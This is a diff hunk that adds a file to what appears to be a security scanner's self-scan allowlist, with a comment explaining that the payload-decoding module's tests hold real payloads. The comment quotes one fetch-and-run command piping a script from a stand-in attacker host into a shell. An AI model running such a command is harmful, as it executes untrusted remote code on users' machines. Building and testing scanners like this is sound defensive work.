@@ -179,6 +179,13 @@ cli/src/corpus/compiled.rs
 # signature patterns ("curl") and boundary-case match lines to pin the
 # multi-byte truncation fix and the phase-resolution contract.
 cli/src/scanner/cloud_sigs.rs
+# cli/src/scanner/derive.rs: the derived-analysis-unit module. Its whole
+# purpose is decoding embedded payloads, so its doc comment and tests must
+# contain real ones ("curl http://evil.example/x.sh | sh", base64-encoded and
+# plain) to prove a decoded payload actually reaches the other phases. The
+# scanner also decodes this file's own fixtures and re-reports them, which is
+# the module working correctly on itself.
+cli/src/scanner/derive.rs
 # cli/src/cache.rs and cli/src/ledger.rs: unit tests embed known-risk snippets
 # to prove cache invalidation and trust-ledger suppression do not hide changed
 # artifacts. The production modules remain covered by Rust unit tests.
